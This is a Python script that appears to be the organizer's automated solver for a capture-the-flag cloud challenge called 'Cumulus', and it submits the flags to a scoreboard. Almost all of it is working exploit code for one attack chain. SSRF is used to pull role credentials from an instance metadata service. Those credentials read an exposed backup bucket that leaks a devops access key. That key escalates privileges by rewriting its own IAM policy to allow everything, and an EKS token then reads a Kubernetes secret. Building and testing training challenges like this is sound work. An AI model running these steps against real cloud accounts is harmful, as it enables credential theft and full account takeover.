#!/usr/bin/env python3
"""
Cumulus — automated solver / organizer self-check.
Walks the whole cloud kill-chain:
  1 SSRF through the public app -> IMDS -> steal the instance role credentials
  2 use those creds on the control plane -> read the misconfigured S3 backups
    bucket -> flag + a devops IAM user's access key
  3 iam:CreatePolicyVersion on the devops user's own policy -> rewrite it to *:*
    -> become admin
  4 admin -> STS EKS get-token -> read the cluster-master secret on the kube api
Submits each flag to the scoreboard. Exits 0 iff all four are correct.
"""
import json, re, sys, base64, urllib.request, urllib.parse, urllib.error

WEB = "http://web"
CP = "http://controlplane"
K8S = "http://kubeapi"
SB = "http://scoreboard"


def req(url, data=None, headers=None):
    h = {"Content-Type": "application/json"} if data is not None else {}
    h.update(headers or {})
    r = urllib.request.Request(url, data=(json.dumps(data).encode() if data is not None else None), headers=h)
    try:
        return urllib.request.urlopen(r, timeout=10).read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode()


def ssrf(url):
    return req(WEB + "/fetch?url=" + urllib.parse.quote(url, safe=""))


def mf(t):
    m = re.search(r"CLD\{[^}]*\}", t or "")
    return m.group(0) if m else None


R = {1: None, 2: None, 3: None, 4: None}
try:
    # -- stage 1: SSRF -> IMDS --
    R[1] = mf(ssrf("http://imds/latest/user-data"))
    inst_key = json.loads(
        ssrf("http://imds/latest/meta-data/iam/security-credentials/cumulus-web-instance")
    )["AccessKeyId"]

    # -- stage 2: S3 backups bucket with the instance role creds --
    ih = {"X-Cloud-Access-Key": inst_key}
    json.loads(req(CP + "/s3/cumulus-backups", headers=ih))   # ListBucket
    R[2] = mf(json.loads(req(CP + "/s3/cumulus-backups/flag.txt", headers=ih)).get("Body"))
    dev_obj = json.loads(req(CP + "/s3/cumulus-backups/iam/devops-ci-access-key.json", headers=ih))
    dev_key = json.loads(dev_obj["Body"])["AccessKeyId"]

    # -- stage 3: IAM privesc via CreatePolicyVersion --
    dh = {"X-Cloud-Access-Key": dev_key}
    req(CP + "/iam/CreatePolicyVersion",
        data={"PolicyName": "devops-policy",
              "PolicyDocument": {"Statement": [{"Action": "*", "Resource": "*"}]}},
        headers=dh)
    R[3] = mf(json.loads(req(CP + "/iam/whoami", headers=dh)).get("flag", ""))

    # -- stage 4: STS EKS token -> kube api secret --
    tok = json.loads(req(CP + "/sts/eks-get-token", headers=dh))["status"]["token"]
    sec = json.loads(req(K8S + "/api/v1/namespaces/kube-system/secrets/cluster-master",
                         headers={"Authorization": "Bearer " + tok}))
    R[4] = mf(base64.b64decode(sec["data"]["flag"]).decode())
except Exception as e:
    print("chain error:", type(e).__name__, e)


def submit(flag):
    try:
        return json.loads(req(SB + "/submit", data={"flag": flag})).get("correct", False)
    except Exception:
        return False


NAMES = {1: "SSRF -> IMDS creds", 2: "S3 bucket misconfig",
         3: "IAM CreatePolicyVersion privesc", 4: "EKS -> k8s secret"}
print("== Cumulus — kill-chain solver ==")
ok_all = True
for i in range(1, 5):
    f = R.get(i)
    ok = bool(f) and submit(f)
    ok_all = ok_all and ok
    print(f"  stage {i}  {NAMES[i]:<34} {f or '<failed>'}  {'[✓]' if ok else '[x]'}")
print("\nRESULT:", "ALL 4 FLAGS CAPTURED" if ok_all else "INCOMPLETE")
sys.exit(0 if ok_all else 1)
